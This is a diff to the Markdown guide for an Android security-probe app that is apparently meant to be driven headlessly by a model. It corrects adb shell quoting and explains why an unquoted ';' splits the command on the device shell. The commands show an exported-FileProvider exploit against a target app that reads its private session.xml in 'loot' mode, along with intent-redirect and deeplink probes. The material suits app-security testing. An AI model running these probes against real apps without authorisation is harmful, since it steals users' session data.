@@ -31,15 +31,17 @@ line prints the targetSdk the APK was actually built with.
 ## Drive it headlessly (what a model does)
 
 ```bash
-adb shell am start -S -n com.sanehunters.probe/.MainActivity \
+# The whole am start line in DOUBLE quotes, every value in SINGLE quotes: adb shell hands the line to the
+# device's /bin/sh, which re-parses it — an unquoted `->`, `;`, `&`, `?` or space is a redirect, separator or glob THERE.
+adb shell "am start -S -n com.sanehunters.probe/.MainActivity \
   --es run baseline,enumerate,provider,read,redirect,deeplink \
   --es victim com.target.app \
-  --es finding F-001 --es class "exported provider -> private file read" \
+  --es finding F-001 --es class 'exported provider -> private file read' \
   --es authority com.target.app.fileprovider \
-  --es uri "content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/session.xml" \
+  --es uri 'content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/session.xml' \
   --es proxy com.target.app.ProxyActivity --es extra intent --es mode loot \
-  --es deeplink "targetapp://open?url=https://example.test/" \
-  --ez finish false
+  --es deeplink 'targetapp://open?url=https://example.test/' \
+  --ez finish false"
 adb logcat -s PROBE:V                                   # one line per result:  PROBE|<step>|<key>=<value>
 adb pull /sdcard/Android/data/com.sanehunters.probe/files/ "$E/logs/probe/"   # the file mirror (below)
 ```
@@ -51,7 +53,7 @@ action so no two fires are ever collapsed:
 
 ```bash
 for N in 1 2 3; do
-  adb shell am start -S -a "probe.fire.$N" -n com.sanehunters.probe/.MainActivity --es run provider --es authority "$AUTH" --es verbs query --es paths "/$N"
+  adb shell "am start -S -a probe.fire.$N -n com.sanehunters.probe/.MainActivity --es run provider --es authority '$AUTH' --es verbs query --es paths '/$N'"
 done
 ```
 
@@ -111,8 +113,9 @@ enable their manifest blocks as needed. A manifest receiver never sees an implic
 `s` string · `i` int · `l` long · `z` boolean · `f` float · `d` double · `u` Uri · `b64` byte[] · `sa` string[] (comma) ·
 `ia` int[] (comma) · `intent` nested Intent (`pkg/cls`, or `loot` = our LootActivity carrying `--es uri` with grant flags;
 `loot?action=X` sets its action) · `bundle` nested Bundle (same grammar with `,` between entries and `|` instead of `=`).
-Example: `--es extras "url:s=https://x/;n:i=3;ok:z=true;f:u=content://a/b;cb:intent=loot;raw:b64=AAEC"`.
-Shell quoting: pass the whole value in double quotes; `am start` splits on spaces, not on `;`.
+Example: `--es extras 'url:s=https://x/;n:i=3;ok:z=true;f:u=content://a/b;cb:intent=loot;raw:b64=AAEC'`.
+Shell quoting: the value must reach the DEVICE shell still quoted — `adb shell` re-parses the line on the device, where an
+unquoted `;` ends the command. Put the whole `am start` command in double quotes and the value in single quotes (as above).
 
 ## The log pane is the narration
 
